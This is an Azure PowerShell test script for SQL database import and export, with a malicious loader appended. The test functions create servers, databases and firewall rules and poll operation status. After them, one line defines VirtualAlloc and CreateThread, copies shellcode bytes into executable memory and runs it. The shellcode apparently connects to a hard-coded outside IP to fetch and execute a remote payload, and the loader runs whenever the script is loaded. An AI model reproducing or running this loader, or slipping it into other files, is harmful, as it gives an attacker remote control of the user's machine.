















function Test-ExportDatabase
{
	
    $testSuffix = 90063
    $createServer = $true
    $createDatabase = $true
    $createFirewallRule = $true
    $operationName = "Export"
    $succeeded = $true     
   
    Verify-ImportExport $testSuffix $createServer $createDatabase $createFirewallRule $operationName $succeeded
}

function Test-ImportDatabase
{
	
    $testSuffix = 90062
    $createServer = $true
    $createDatabase = $false
    $createFirewallRule = $true
    $operationName = "Import"
    $succeeded = $true

    Verify-ImportExport $testSuffix $createServer $createDatabase $createFirewallRule $operationName $succeeded
}

 function Verify-ImportExport($testSuffix, $createServer, $createDatabase, $createFirewallRule, $operationName, $succeeded)
 {
	
    $params = Get-SqlDatabaseImportExportTestEnvironmentParameters  $testSuffix
    $rg = New-AzResourceGroup -Name $params.rgname -Location $params.location
    $export = "Export"
    $import = "Import"

	try
	{       
        Assert-NotNull $params.storageKey
        Assert-NotNull $params.importBacpacUri
        Assert-NotNull $params.exportBacpacUri

        $password = $params.password
        $secureString = ($password | ConvertTo-SecureString -asPlainText -Force) 
        $credentials = new-object System.Management.Automation.PSCredential($params.userName, $secureString) 	
        if($createServer -eq $true){
            $server = New-AzSqlServer -ResourceGroupName  $params.rgname -ServerName $params.serverName -ServerVersion $params.version -Location $params.location -SqlAdministratorCredentials $credentials       
        }

        if($createDatabase -eq $true){
            $standarddb = New-AzSqlDatabase -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName
        }
        
        if($createFirewallRule -eq $true){
            New-AzSqlServerFirewallRule -ResourceGroupName  $params.rgname -ServerName $params.serverName -AllowAllAzureIPs
        }

        $operationStatusLink = ""
                
        if($operationName -eq $export){
            
            $exportResponse = New-AzSqlDatabaseExport -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageKeyType $params.storageKeyType -StorageKey $params.storageKey -StorageUri $params.exportBacpacUri -AdministratorLogin $params.userName -AdministratorLoginPassword $secureString -AuthenticationType $params.authType
            Assert-NotNull $exportResponse
            $operationStatusLink = $exportResponse.OperationStatusLink        
            Assert-AreEqual $exportResponse.ResourceGroupName $params.rgname
            Assert-AreEqual $exportResponse.ServerName $params.serverName
            Assert-AreEqual $exportResponse.DatabaseName $params.databaseName
            Assert-AreEqual $exportResponse.StorageKeyType $params.storageKeyType
            Assert-Null $exportResponse.StorageKey
            Assert-AreEqual $exportResponse.StorageUri $params.exportBacpacUri
            Assert-AreEqual $exportResponse.AdministratorLogin $params.userName
            Assert-Null $exportResponse.AdministratorLoginPassword
            Assert-AreEqual $exportResponse.AuthenticationType $params.authType
        }

        if($operationName -eq $import){
            $importResponse = New-AzSqlDatabaseImport -ResourceGroupName $params.rgname -ServerName $params.serverName -DatabaseName $params.databaseName -StorageKeyType $params.storageKeyType -StorageKey $params.storageKey -StorageUri $params.importBacpacUri -AdministratorLogin $params.userName -AdministratorLoginPassword $secureString -Edition $params.databaseEdition -ServiceObjectiveName $params.serviceObjectiveName -DatabaseMaxSizeBytes $params.databaseMaxSizeBytes -AuthenticationType $params.authType
            Assert-NotNull $importResponse
            $operationStatusLink = $importResponse.OperationStatusLink
            Assert-AreEqual $importResponse.ResourceGroupName $params.rgname
            Assert-AreEqual $importResponse.ServerName $params.serverName
            Assert-AreEqual $importResponse.DatabaseName $params.databaseName
            Assert-AreEqual $importResponse.StorageKeyType $params.storageKeyType
            Assert-Null $importResponse.StorageKey
            Assert-AreEqual $importResponse.StorageUri $params.importBacpacUri
            Assert-AreEqual $importResponse.AdministratorLogin $params.userName
            Assert-Null $importResponse.AdministratorLoginPassword
            Assert-AreEqual $importResponse.AuthenticationType $params.authType
            Assert-AreEqual $importResponse.Edition $params.databaseEdition
            Assert-AreEqual $importResponse.ServiceObjectiveName $params.serviceObjectiveName
            Assert-AreEqual $importResponse.DatabaseMaxSizeBytes $params.databaseMaxSizeBytes
        }
		
        Assert-NotNull $operationStatusLink		

        
        $statusInProgress = "InProgress"
        $statusSucceeded = "Succeeded"
        $status = "InProgress"

        if($succeeded -eq $true){
            Write-Output "Getting Status" 
            while($status -eq $statusInProgress){
                $statusResponse = Get-AzSqlDatabaseImportExportStatus -OperationStatusLink $operationStatusLink
                Write-Output "Import Export Status Message:" + $statusResponse.StatusMessage  
                Assert-AreEqual $statusResponse.OperationStatusLink $operationStatusLink
                $status = $statusResponse.Status
                 if($status -eq $statusInProgress){
                    Assert-NotNull $statusResponse.LastModifiedTime
                    Assert-NotNull $statusResponse.QueuedTime
                    Assert-NotNull $statusResponse.StatusMessage
                 }
            }
            Assert-AreEqual $status $statusSucceeded
            Write-Output "ImportExportStatus:" + $status 
        }      
    }
    finally
    {
       Remove-ResourceGroupForTest $rg
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb9,0x61,0xd2,0xd9,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

